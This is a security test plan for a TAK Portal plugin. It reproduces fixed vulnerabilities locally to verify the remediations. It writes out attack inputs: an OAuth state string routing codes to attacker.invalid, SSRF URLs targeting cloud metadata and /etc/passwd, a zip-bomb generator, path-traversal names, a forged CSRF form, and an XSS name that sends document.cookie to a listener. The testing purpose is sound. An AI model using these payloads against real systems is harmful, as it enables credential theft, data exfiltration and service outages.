# Server-Side Test Plan — TAK Portal + Infra-TAK + the OAuth Relay (WP4)

Covers everything changed by work package WP4: `TAKPortal/**`, `Infra-TAK/**` and
`docs/featurelink-oauth-relay.html`.

Every step below is runnable against your own instance. Nothing here touches an external host,
scans anything you do not own, or sends real credentials anywhere.

**Start with Test 1.** C-01 is the highest-ranked finding in the entire suite and Test 1 is the
single most important check in this session.

---

## 0. Setup

### 0.1 What is new that you must install

The module has always required two npm packages — `multer` and `unzipper` — and **`install.sh`
never installed them.** If they are missing, `require` throws `MODULE_NOT_FOUND` at boot and the
**entire TAK Portal fails to start**: this module took the whole product down. Nothing declared
them either, so there was no way to notice.

There is now a `TAKPortal/package.json` that declares them. Two things to know:

- `multer` is pinned to **2.x**. The tree previously resolved 1.4.5-lts, which npm now flags as
  deprecated with known vulnerabilities. The API this module uses (`diskStorage`, `.array()`) is
  unchanged.
- `express` is a dev dependency here only so the test suite can boot the routers standalone. The
  host portal supplies the real one.

On the TAK Portal host, before restarting the stack:

```bash
cd ~/TAK-Portal            # or wherever server.js lives
npm install --save multer@^2 unzipper@^0.12
node -e "require('multer'); require('unzipper'); console.log('deps OK')"
```

`install.sh` still does **not** do this for you — the install-script remediation (C-12) is
deferred, see §9. **Run the two commands above by hand before every install or upgrade.**

### 0.2 New environment variable (C-04)

Outbound ArcGIS requests are now restricted to an allowlist. The default is Esri's public cloud:

```
*.arcgis.com, *.arcgisonline.com, *.esri.com
```

If you use **ArcGIS Enterprise**, or any portal that is not on those domains, the icon generator
will refuse to reach it until you say so:

```bash
# docker-compose.yml, under the portal service's environment:
FEATURELINK_ARCGIS_ALLOWED_HOSTS=*.arcgis.com,*.arcgisonline.com,gis.yourorg.mil
```

Rules: comma or whitespace separated; `host` or `*.suffix`; no scheme, no path, no bare `*`.
An **empty** value means deny everything — it never means allow everything.

> If icon generation stops working right after this upgrade, this is almost certainly why.
> The error names the host: *"Blocked: "gis.yourorg.mil" is not a permitted ArcGIS host."*

### 0.3 Registering your CloudTAK origins in the relay (C-01) — **required**

`docs/featurelink-oauth-relay.html` ships with an **empty** allowlist, so out of the box it
refuses to forward anything. Before OAuth sign-in will work you must edit it and list every
deployment permitted to complete sign-in:

```js
var REGISTERED_ORIGINS = [
    "https://cloudtak.yourorg.example",
    "https://takportal.yourorg.example",
];
```

Scheme + host + optional port. No path, no trailing slash, no wildcards. Then redeploy the page
wherever it is hosted (this is the fixed ArcGIS `redirect_uri`).

### 0.4 Run the automated tests

```bash
cd TAK-PluginSuite-FeatureLink/TAKPortal
npm install
npm test
```

Expected tail:

```
ℹ tests 93
ℹ suites 0
ℹ pass 93
ℹ fail 0
```

`npm run lint` syntax-checks every route and service. Both should be run before any deploy.

> The suite boots all four routers in a real Express app with the two host-portal services
> (`auditLog.service`, `apiErrorPayload.service`) stubbed, so a green run proves the module
> *loads and mounts* — it does not prove your specific portal's middleware order is right. Test 2
> covers that on the real host.

---

## 1. C-01 — OAuth relay must never forward the code to an attacker-named origin ⚠️ **DO THIS FIRST**

**This is the #1 finding in the whole audit.** Before the fix, the relay read its `postMessage`
destination out of the OAuth `state` parameter — splitting it on `::` and using the leading
segment. `state` round-trips through the user's browser and ArcGIS echoes it back untouched, so
anyone who could hand a victim a crafted authorize link received that victim's **ArcGIS
authorization code** at an origin of their choosing. Full account/token compromise for any user
who completed sign-in through the link. The one file serves both CloudTAK and TAK Portal.

### 1.1 The attack string

This is the exact `state` value. Use `attacker.invalid` — `.invalid` is reserved by RFC 2606 and
can never resolve, so nothing leaves your machine even if something went wrong.

```
https://attacker.invalid::abc123nonce
```

URL-encoded for the query string:

```
https%3A%2F%2Fattacker.invalid%3A%3Aabc123nonce
```

### 1.2 Steps — no ArcGIS account needed

1. Serve the relay locally:
   ```bash
   cd TAK-PluginSuite-FeatureLink/docs
   python -m http.server 8099
   ```
2. Edit `featurelink-oauth-relay.html` and set the allowlist to a test origin:
   ```js
   var REGISTERED_ORIGINS = ["http://127.0.0.1:8099"];
   ```
3. Save this as `docs/relay-attack-test.html` and open `http://127.0.0.1:8099/relay-attack-test.html`:
   ```html
   <!doctype html>
   <meta charset="utf-8">
   <h1>C-01 relay check</h1>
   <button id="go">Open relay with the attacker state</button>
   <pre id="out">waiting…</pre>
   <script>
   window.addEventListener('message', function (e) {
     document.getElementById('out').textContent +=
       '\nRECEIVED from ' + e.origin + ': ' + JSON.stringify(e.data);
   });
   document.getElementById('go').onclick = function () {
     window.open('/featurelink-oauth-relay.html'
       + '?code=TEST_AUTH_CODE_12345'
       + '&state=' + encodeURIComponent('https://attacker.invalid::abc123nonce'),
       'relay', 'width=500,height=300');
   };
   </script>
   ```
4. Click the button. Watch the popup, and open DevTools → Network on it.

### 1.3 What a correct result looks like

- The popup shows **“Signed in — you can close this window.”** and closes after ~1 second.
- The opener page (`127.0.0.1:8099`, which IS on the allowlist) prints
  `RECEIVED from http://127.0.0.1:8099: {"source":"featurelink-oauth-relay","code":"TEST_AUTH_CODE_12345",…}`.
- **The `state` value is echoed back whole and unparsed:** `"state":"https://attacker.invalid::abc123nonce"`.
  That is correct and intended — the nonce must reach the opener so it can match its own pending
  request. What matters is that it did not *select* the destination.
- **`attacker.invalid` appears nowhere as a message destination.** There is no request to it, and
  no `postMessage` was aimed at it.

### 1.4 Prove the negative — the important half

Repeat with the allowlist set to something the opener is **not**:

```js
var REGISTERED_ORIGINS = ["https://cloudtak.yourorg.example"];
```

- The popup still shows “Signed in”.
- **The opener receives nothing at all.** The `RECEIVED` line never appears.

That is the fix: the destination comes only from the allowlist, and the browser delivers a
`postMessage` only when the target origin equals the opener's real origin.

### 1.5 Pre-fix behaviour, for contrast

Against commit `a8f6f4a` the same steps deliver `code=TEST_AUTH_CODE_12345` to
`https://attacker.invalid`. Automated equivalent:

```bash
cd TAKPortal && node --test test/oauthRelay.test.js
```

9 tests; 7 of them fail against `a8f6f4a`, including
*"the exact attack string that used to work now delivers nothing to the attacker"*.

### 1.6 Live end-to-end (needs a real ArcGIS org)

After 0.3, run a normal FeatureLink sign-in from a registered CloudTAK/Portal origin and confirm it
still completes. **If it does not, the allowlist entry does not exactly match the browser's
origin** — check for a trailing slash, a missing port, or `http` vs `https`. Open the popup's
console; a malformed entry logs
`featurelink-oauth-relay: N malformed entry/entries in REGISTERED_ORIGINS were ignored.`

---

## 2. Boot check — the Portal must still start

The five new services (`featurelinkAccess`, `featurelinkCsrf`, `featurelinkHttp`,
`featurelinkRateLimit`, `featurelinkSafeFetch`) are wired into all four route files. A missing
import or a half-wired guard shows up here.

1. `bash TAKPortal/install.sh /path/to/TAK-Portal` (after doing 0.1 by hand).
2. `docker compose logs -f` — no `MODULE_NOT_FOUND`, no stack trace at startup.
3. Sign in and visit **Onboarding → FeatureLink** and **Administration → FeatureLink Configs**.
   Both must render, and the configs table must populate.
4. Open **Administration → FeatureLink Configs → + Add Data Layer(s)**. The configurator must load,
   the icon picker must show icons, and QR generation must work.
5. In DevTools → Application → Cookies, confirm a **`fl_csrf`** cookie with `SameSite=Lax` and (on
   HTTPS) `Secure`.
6. **Save a config.** This exercises CSRF + the size caps + the atomic write in one action.

**Expected:** all pass. **If step 6 returns 403** with *"missing or invalid CSRF token"*, the page
was served from a cache predating the cookie — hard-reload and retry. If it persists, the page
route is not passing through `issueCsrfCookie`; see §9.

---

## 3. C-03 — broken access control (cross-tenant read and destructive overwrite)

**Needs two accounts.** Create `testuser-a` and `testuser-b`, neither holding
`page.featurelink_configs`, plus your normal admin account.

### 3.1 Cross-tenant read of a saved config

1. As **A**, create and save a config named `A-private`. Note its id from the URL
   (`?load=<id>`) — call it `AID`.
2. As **B** (different browser profile / private window), run in the DevTools console:
   ```js
   await (await fetch('/api/featurelink/admin/datasets/AID', {credentials:'same-origin'})).text()
   ```
3. **Expected:** `404` and `{"ok":false,"error":"not found"}`.
   **Pre-fix:** `200` with A's entire record — `state.cfg`, `source_url`, and anything pasted into
   them, including tokens.
4. As **A**, the same call returns `200`. As **admin**, `200`. Both must still work.

> 404 rather than 403 is deliberate: a 403 confirms the id exists, which turns the endpoint into an
> enumeration oracle over ids that are shared as QR links.

### 3.2 Cross-tenant download of the raw uploaded file

1. As **A**, save a config sourced from an uploaded CSV.
2. As **B**: `fetch('/api/featurelink/admin/datasets/AID/file')`
3. **Expected:** `404`. **Pre-fix:** `200` and the raw bytes — for CAP/SAR that is PII and
   operational location data.
4. As **A**: `200`, and the response carries `Content-Disposition: attachment` and
   `X-Content-Type-Options: nosniff` (was `inline` with no nosniff).

### 3.3 The list endpoint

As **B**, load **Administration → FeatureLink Configs** (or `GET /api/featurelink/admin/datasets`).
**Expected:** B sees only B's configs, and no `created_by` field. Admin still sees everything.

### 3.4 Destroying another user's icon set — the worst one

`POST /from-arcgis` did `rmSync(setDir, {recursive:true, force:true})` on any name collision with
**no ownership check at all**, bypassing both the delete guard and the in-use 409 guard. Silent,
field-wide marker loss on every device that had not pre-installed the set.

1. As **A**, generate an icon set from an ArcGIS layer (load a layer by URL in the configurator).
   Note the set name in **Icon Sets**.
2. As **B**, point the configurator at *any* layer whose name sanitizes to the same string, or call
   directly:
   ```js
   await (await fetch('/api/featurelink/admin/custom-icons/from-arcgis', {
     method:'POST', credentials:'same-origin',
     headers:{'Content-Type':'application/json',
              'X-FeatureLink-CSRF':document.cookie.match(/fl_csrf=([^;]*)/)[1]},
     body: JSON.stringify({url:'<a layer URL with the same sanitized name>'})
   })).json()
   ```
3. **Expected:** `403` — *"An icon set named … already exists and belongs to another user."*
   A's set is untouched: same icon count, same uid.
   **Pre-fix:** `200`, and A's directory was deleted and replaced.

### 3.5 Appending to another user's icon set

As **B**, upload a zip to **Icon Sets** using **A's existing set name**.
**Expected:** `403`, *"… belongs to another user. Choose a different icon set name."*
**Pre-fix:** the upload succeeded, and a zip containing an `iconset.xml` **overwrote A's uid** —
every config referencing that set then resolved to an attacker-chosen `iconsetpath` on-device.

### 3.6 Legacy / Flask-written records are now admin-only

Any record with no `created_by` — everything written before ownership tracking, and **everything
Infra-TAK writes, since the Flask module has no ownership model at all** — used to be readable,
editable and deletable by *anyone* (`isOwnedBy` returned true for a null owner). It is now
admin-only.

**Expected:** an ordinary user gets 404 on read and 403 on delete for such a record; an admin can
still manage it. **Watch for this in the field:** if operators report "I can't see my old configs
any more", this is why — an admin must open them and re-save to stamp an owner. This is a
deliberate, breaking, fail-closed change.

---

## 4. C-04 — SSRF (safe local repro)

Everything here targets **your own machine**. Nothing is scanned that you do not own.

### 4.1 Cloud metadata — the one that steals credentials

In the configurator, paste this as the FeatureLayer URL, or call `/from-arcgis` with it:

```
http://169.254.169.254/latest/meta-data/FeatureServer/0
```

**Expected:** `400`, *"Blocked: "169.254.169.254" is not a permitted ArcGIS host."*
**Pre-fix:** the portal fetched it and returned the cloud instance's IAM credentials in the error
path. **On any cloud-hosted portal this was full credential theft by any logged-in user.**

### 4.2 Loopback and internal services

Run a listener you control:

```bash
python -m http.server 8123
```

Then try each of these:

| URL | Expected |
|---|---|
| `http://127.0.0.1:8123/FeatureServer/0` | 400 "not a permitted ArcGIS host" |
| `http://localhost:8123/FeatureServer/0` | 400 |
| `http://[::1]:8123/FeatureServer/0` | 400 |
| `http://10.0.0.5/FeatureServer/0` | 400 |
| `http://takserver:8443/FeatureServer/0` | 400 |
| `file:///etc/passwd` | 400 "only http and https are allowed" |
| `gopher://127.0.0.1:11211/_stats` | 400 |
| `https://user:pass@services1.arcgis.com/x/FeatureServer/0` | 400 "embedded credentials" |

**Confirm the listener's terminal logs NOTHING for any of them.** Pre-fix, every one produced a
request, and the two distinct error strings made it a working internal port scanner.

### 4.3 DNS rebinding — the case an allowlist alone does not stop

This is why the address check happens **after** DNS resolution and the connection is then made to
the checked address.

```bash
FEATURELINK_ARCGIS_ALLOWED_HOSTS=localhost   # temporarily, in the portal env
```

Then request `http://localhost:8123/FeatureServer/0`.

**Expected:** still refused —
*"Blocked: "localhost" resolves to a private, loopback or link-local address."*
The host is explicitly allowlisted **by name** and is still refused **because of where it
resolves**. Remember to put the variable back.

### 4.4 Timeout — the trivial portal-wide DoS

```bash
# a tarpit: accepts the connection, never answers
python -c "
import socket
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('127.0.0.1',8124)); s.listen(50)
print('tarpit on 8124'); conns=[]
while True: conns.append(s.accept())
"
```

Point `/from-arcgis` at it (with `localhost` temporarily allowlisted, per 4.3, so you reach the
transport rather than the allowlist).

**Expected:** the request fails within ~10 s with *"the ArcGIS host did not respond in time."*
**Pre-fix:** `fetch` had **no timeout at all** — the request handler and socket were held open
indefinitely, and a handful of concurrent calls exhausted the connection pool and took the portal
down.

Also try firing 5 at once: after 2 concurrent generations per user you get
`429 "Another icon-set generation is already running."`, and more than 12/minute gives `429`.

### 4.5 Redirect re-validation

Serve a redirector on a host you have allowlisted that 302s to `http://169.254.169.254/`.
**Expected:** refused at the second hop with *"not a permitted ArcGIS host"*. Every hop is
re-validated; there is a 3-hop cap.

### 4.6 Automated equivalent

```bash
cd TAKPortal && node --test test/ssrf.test.js
```
18 tests covering the full matrix plus the timeout, the size cap, the redirect cap, the Bearer
token (C-21) and the ArcGIS-200-with-error-body guard (C-22).

---

## 5. C-11 — zip decompression bomb (safe local repro)

Pre-fix, the per-entry size check read `uncompressedSize` **from the attacker's own zip header**
and then inflated the entry with no independent limit. A zip declaring 1 KB and delivering
gigabytes of deflated zeroes OOM'd the Node process — a single-request remote crash of the whole
portal.

### 5.1 Build a bomb (about 20 KB on disk, 24 MB inflated)

```bash
python - <<'PY'
import zipfile
with zipfile.ZipFile('bomb.zip','w',zipfile.ZIP_DEFLATED,compresslevel=9) as z:
    z.writestr('Group/bomb.png', b'\x89PNG\r\n\x1a\n' + b'\x00'*(24*1024*1024))
print('bomb.zip built')
PY
ls -lh bomb.zip
```

Upload it through **Icon Sets → upload**.

**Expected:** rejected in well under a second with *"No image files found…"* / *"too large"*.
Portal memory is flat; the container does not restart.
**Pre-fix:** the whole 24 MB was inflated into memory. Scale the padding to 5 GB and the process
died.

> Keep the padding at 24 MB for the first run. Only try a larger one if you are willing to restart
> the portal, and only against a test instance.

### 5.2 Entry flood

```bash
python - <<'PY'
import zipfile
with zipfile.ZipFile('flood.zip','w',zipfile.ZIP_DEFLATED) as z:
    for i in range(3000):
        z.writestr('d%d/iconset.xml' % i, "<iconset name='x' uid='y'/>")
PY
```

**Expected:** rejected — *"This zip has 3000 entries — the limit is 2000."*
**Pre-fix:** the counter only incremented for successfully extracted **images**, so an archive of
100,000 entries all named `iconset.xml` never tripped it, and every one was buffered and
regex-parsed.

### 5.3 Path traversal and disguised files

| Entry name / content | Expected |
|---|---|
| `../../../../etc/cron.d/x.png` | skipped, "unsafe path" |
| `/etc/passwd.png` | skipped |
| `C:\Windows\evil.png` | skipped |
| `Group/shell.png` containing `<?php … ?>` | skipped, "not a valid image" |
| `Group/x.svg` containing `<script>` | skipped — SVG is no longer an accepted type |

The last two matter: file-type validation was **extension only**, so an HTML or script payload
named `x.png` was stored and then served from the portal origin, and a real `.svg` was served as
`image/svg+xml` and executed.

Also check a group named `../../evil` in a zip: the exported iconset (**Icon Sets → Download**)
must contain no `..` in any entry path. Pre-fix, that string propagated into every generated config
and into the exported archive — a zip-slip aimed at whatever unpacks it.

### 5.4 A legitimate upload still works

Upload a real ATAK iconset zip. **Expected:** imports, icons appear in the picker, and if it
carries a valid `iconset.xml` the uid is taken from it verbatim. A **second** upload to the same
set must not change an already-linked uid.

### 5.5 Automated equivalent

```bash
cd TAKPortal && node --test test/zipbomb.test.js
```

---

## 6. C-10 — CSRF

### 6.1 Cross-origin POST

Save this as `csrf-test.html` and open it from a **different origin** than the portal (e.g.
`python -m http.server 9000` in another directory), while signed in to the portal in the same
browser:

```html
<!doctype html>
<h1>C-10 CSRF check</h1>
<form method="POST" action="https://YOUR-PORTAL/api/featurelink/admin/datasets"
      enctype="text/plain">
  <input name='{"name":"CSRF-PROOF","source_type":"file","state":{},"x":"' value='"}'>
  <button>Attempt the forged save</button>
</form>
```

**Expected:** `403` —
*"Request blocked: cross-site or missing Origin. Reload the page and try again."*
Then reload **Administration → FeatureLink Configs**: there must be **no** config named
`CSRF-PROOF`.
**Pre-fix:** `grep -r 'csrf\|SameSite' TAKPortal/` returned zero files, and this created the record.

### 6.2 The more damaging version — forged delete

Same idea against `DELETE /api/featurelink/admin/datasets/<id>` from a foreign page via `fetch`
(it will be blocked by CORS preflight *and* by the Origin check — the point is that the record
survives). Confirm the config is still there afterwards.

### 6.3 Token, not just Origin

In the portal's own DevTools console (same origin, so Origin passes):

```js
// no token -> must fail
await (await fetch('/api/featurelink/admin/datasets', {
  method:'POST', credentials:'same-origin',
  headers:{'Content-Type':'application/json'},
  body: JSON.stringify({name:'no-token', source_type:'file', state:{}})
})).status
// -> 403, "missing or invalid CSRF token"

// with the token -> must succeed
await (await fetch('/api/featurelink/admin/datasets', {
  method:'POST', credentials:'same-origin',
  headers:{'Content-Type':'application/json',
           'X-FeatureLink-CSRF': document.cookie.match(/fl_csrf=([^;]*)/)[1]},
  body: JSON.stringify({name:'with-token', source_type:'file', state:{}})
})).status
// -> 200
```

### 6.4 Normal use must be unaffected

Save a config, upload an icon set, delete a config, delete an icon set, generate from ArcGIS — all
through the UI. **All must work.** If any returns 403, the page's `flCsrfHeaders()` is not being
applied to that call; report which one.

### 6.5 GET is not blocked

Loading any page or list with a foreign `Referer` must still work. Safe methods are exempt.

---

## 7. C-05 — stored and DOM XSS

### 7.1 The admin-page escalation (the confirmed one)

1. As an **ordinary, non-admin** user, save a config named exactly:
   ```
   x" onmouseover="fetch('//127.0.0.1:8123/'+document.cookie)
   ```
   (with `python -m http.server 8123` running so you would see a hit).
2. As an **admin**, open **Administration → FeatureLink Configs** and move the mouse over the row.

**Expected:** the name renders as literal text, no request reaches port 8123, and the QR / Copy
link / Delete buttons all still work.
**Pre-fix:** this executed **in the admin's browser** — privilege escalation from any user to
portal admin.

### 7.2 The configurator's data preview

Load a CSV containing:

```csv
a');alert(1);('  ,normal
<img src=x onerror=alert(1)>,ok
```

**Expected:** no alert when the page renders, and **no alert when you click the column header to
sort** (the column name used to be interpolated straight into `onclick="sortBy('…')"`). The
header sorts normally. Field names in the left panel behave the same way.

Also test a file named `<svg onload=alert(1)>.csv` — the file chip must show it as text.

### 7.3 The shared-link path

Save a config with a hostile name, then open its **QR / Copy link** (`?load=<id>`) as another user.
That link is exactly what the "Saved Dataset Link" QR mode exists to share.
**Expected:** renders as text.

### 7.4 Infra-TAK console

Same payload as 7.1 through the Infra-TAK hub (`/featurelink`). The QR button must render as text
**and must actually work** — pre-fix, Flask's `tojson` did not escape `"`, so the button's markup
was malformed and **the QR button was functionally broken for every dataset**, hostile name or not.

### 7.5 Automated equivalent

```bash
cd TAKPortal && node --test test/configuratorXss.test.js
```

---

## 8. C-38 — vendored libraries / DDIL

Both browser libraries are now served from the portal's own origin.

1. DevTools → Network, hard-reload the configurator. **No request to `cdn.jsdelivr.net` or
   `cdn.sheetjs.com`.** Everything loads from your host.
2. **The real test:** block outbound internet (or pull the host's uplink), then reload. Excel
   import and **every QR code** must still work.
   **Pre-fix:** both silently stopped working and `featurelink-configs.ejs` threw
   `QRCode is not defined`. For an air-gapped or DDIL TAK deployment that was a functional defect,
   not just a supply-chain one.
3. Verify integrity if you wish:
   ```bash
   sha256sum TAKPortal/assets/featurelink-configurator/vendor/*.js
   ```
   must match the digests in that directory's `VENDOR.md`.

---

## 9. C-39 — the double-truncation fix, and whether you need to migrate

### 9.1 What changed

- **No UID changed.** `uid = SHA-256(canonicalUrl + "/" + field)`. The layer name is not an input.
- The **group** — the middle segment of `{uid}/{group}/{file}` — is corrected for layer names whose
  sanitized base is **longer than 54 characters**.
- **No `usericonPath` in any saved config needs rewriting.** Those already carried the untruncated
  group; that half of the Portal was already right. It was the *stored icon-set name* that was
  truncated, and the two halves disagreed with each other.

### 9.2 Do you have any affected sets? (detection recipe)

On the portal host:

```bash
docker compose exec <portal-service> \
  node -e "
    const fs=require('fs');
    const p='/app/data/featurelink-configs/custom-icons/manifest.json';
    const sets=JSON.parse(fs.readFileSync(p,'utf-8'));
    const hits=sets.filter(s=>s.source==='arcgis-renderer' && s.name.length===60);
    console.log(hits.length?'AFFECTED:':'none affected');
    hits.forEach(s=>console.log(' -',JSON.stringify(s.name),'uid',s.uid));
  "
```

A set is suspect if it was auto-generated (`source: "arcgis-renderer"`) **and** its stored name is
exactly 60 characters — the old cap. A genuine 60-character name is possible but rare; check
whether the name looks cut off mid-word.

### 9.3 If any are affected

1. In the configurator, re-load the source layer. A new set is registered under the full
   (up to 66-character) name.
2. Confirm in **Icon Sets** that both the old truncated entry and the new one exist.
3. Confirm the old one shows **"Not referenced by any saved config"** — if it is still referenced,
   open those configs and re-pick the icon set before deleting.
4. Delete the orphaned truncated entry.
5. On a device, confirm the markers resolve.

**If §9.2 reports "none affected", there is nothing to do.**

### 9.4 Automated equivalent

```bash
cd TAKPortal && node --test test/goldenVectors.test.js
```

Shared fixture: **`TAKPortal/test/fixtures/auto-iconset-golden-vectors.json`** — also consumed by
the ATAK, WinTAK and CloudTAK conformance suites. All four must agree byte for byte.

---

## 10. Regression sweep — things that must NOT have broken

Work through these; they are the paths most likely to have been damaged by the security changes.

| # | Action | Expected |
|---|---|---|
| 10.1 | Upload a CSV, configure symbology/labels/popup, Save | works |
| 10.2 | Re-open via `?load=<id>` | config restored exactly |
| 10.3 | Export Config JSON | downloads |
| 10.4 | Load a live FeatureLayer by URL (allowlisted host) | loads, auto-symbology runs |
| 10.5 | Generate an icon set from an ArcGIS renderer | set appears, icons resolve |
| 10.6 | Icon Sets → Download | a valid zip that ATAK imports |
| 10.7 | Delete an in-use icon set | 409 naming the configs; force works |
| 10.8 | Field user: Onboarding → FeatureLink → Open in ATAK | config loads on device |
| 10.9 | Field user: Download | file downloads |
| 10.10 | Admin deletes another user's config | still permitted |
| 10.11 | Save a dataset with a ~5 MB Excel file | works (or a clear size error, not a silent 413) |
| 10.12 | Uninstall, then reinstall | portal boots both times |

**10.12 is high risk — see §11.**

---

## 11. High risk — test these hardest

Ranked. These are the things I could **not** verify on this machine.

1. **Install and uninstall (C-12 — NOT FIXED, deferred).**
   `uninstall.sh` still does not delete `featurelinkCustomIcons.routes.js`,
   `featurelinkCustomIcons.service.js` or `featurelinkArcgisIconset.service.js` — **exactly the
   SSRF and zip-bomb sinks**. Uninstalling leaves those endpoints on disk. Worse, the `server.js`
   unpatcher is four exact-string replacements with **no verification** that prints
   "removed …" unconditionally; if the mount block does not match all four literals, the `require`
   line survives while the file it points at is deleted → `MODULE_NOT_FOUND` → **the portal is
   permanently down after an uninstall, with a success message printed.**
   **Test on a disposable instance only. Back up `server.js`, `permissions.registry.js`,
   `portalAuth.middleware.js` and `views/partials/sidebar.ejs` before running either script.**
   Neither script takes a backup itself.

2. **CSRF against your real portal's middleware order.** The token check assumes this module's
   routers see `req.headers` untouched and that your reverse proxy forwards `Origin` and
   `X-Forwarded-Host` faithfully. If Caddy/nginx rewrites `Host` without setting
   `X-Forwarded-Host`, **every mutating request will 403.** Test 6.4 is the canary. This is the
   single most likely way these changes break a working deployment.

3. **The host portal's own session cookie.** `SameSite=Lax` on `fl_csrf` protects our
   double-submit token; it does **not** change the flags on the portal's Authentik session cookie,
   which this module does not own. Verify in DevTools that the session cookie is
   `SameSite=Lax; Secure; HttpOnly`. If it is not, raise it with the TAK Portal upstream — see
   `QUESTIONS-FOR-OWNER.md` (WP4).

4. **The ArcGIS host allowlist against your real org.** Only you know your ArcGIS URLs. §0.2. If
   icon generation breaks after upgrade, this is the first thing to check.

5. **The unowned-record change (§3.6).** Deliberately fail-closed and deliberately breaking for
   legacy and Flask-written records. Confirm on a copy of production data how many records have a
   null `created_by` before rolling out:
   ```bash
   docker compose exec <portal-service> sh -c \
     'grep -L "\"created_by\": *\"" /app/data/featurelink-configs/datasets/*/record.json | wc -l'
   ```

6. **Upload limits.** Per-file cap dropped from 25 MB to 8 MB and per-request from 200 files to 25,
   plus a 200 MB/user/day quota. Generous for real iconsets, but if your operators upload very
   large sets, confirm before rollout.

7. **Rate limits are per-process.** If you ever run more than one portal container, the limits and
   the concurrency cap become per-instance.

8. **A headless-browser XSS assertion does not exist.** §7 is manual. The automated suite asserts
   the sinks are absent from the source and that the escaping helper neutralises the payloads, but
   nothing drives a real browser. Test §7 by hand.

---

## 12. Infra-TAK

Changed: the DOM XSS sinks in `featurelink_displayconfig_assets/index.html` and the vendored
libraries. Tests §7.2, §7.3 and §8 apply to the console copy as well —
`/featurelink/featurelink-display-config`.

```bash
cd Infra-TAK && python -m py_compile featurelink_displayconfig.py && echo "syntax OK"
```

**NOT fixed, deferred (see `docs/remediation/wp4-server.md`):**

- The Jinja XSS at `featurelink_displayconfig.py:248` — `{{ d.name|tojson }}` inside an
  `onclick="…"`. **The QR button on the Infra-TAK hub is functionally broken for every dataset**
  and a crafted name injects attributes.
- **No CSRF on any of the 8 Flask routes.**
- **No ownership model at all** — any authenticated console user can read or destroy any other
  user's dataset.
- `install.sh` enforces root and self-updates from a remote with no verification;
  `uninstall.sh:84-105` can leave `app.py` raising `NameError: FEATURELINK_ICON_DATA` on **every
  page load**, taking the whole console offline.

`README.md:86` labels Infra-TAK "Deprecated & not supported", but it remains fully installable and
root-privileged. Until the above are fixed, **treat the Infra-TAK console as trusted-users-only and
do not expose it beyond your own operators.**
